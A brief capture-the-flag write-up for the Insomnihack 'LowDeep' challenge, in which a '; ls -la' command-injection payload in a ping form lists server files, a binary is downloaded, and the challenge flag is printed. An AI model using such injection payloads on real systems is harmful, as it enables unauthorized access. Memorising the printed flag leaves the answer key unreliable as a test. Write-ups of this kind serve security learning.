# LowDeep

> Try out our new ping platform: http://lowdeep.insomnihack.ch/

In this challenge, we have simple command injection vulnerability.

Payload: `; ls -la`

Result:
```
ping: : Name or service not known
total 28
drwxr-xr-x 3 root root 4096 Jan 17 09:57 .
drwxr-xr-x 3 root root 4096 Jan 7 16:52 ..
drwxr-xr-x 4 root root 4096 Jan 17 09:57 _res_
-rw-r--r-- 1 root root 1367 Jan 16 15:30 index.php
-rw-r--r-- 1 root root 6128 Jan 16 13:10 print-flag
-rw-r--r-- 1 root root 42 Jan 16 15:35 robots.txt
```

Next, we can download `print-flag` application [link](http://lowdeep.insomnihack.ch/print-flag), [local copy](print-flag).

`strings print-flag` reveals the flag.

Flag: `INS{Wh1le_ld_k1nd_0f_forg0t_ab0ut_th3_x_fl4g}`
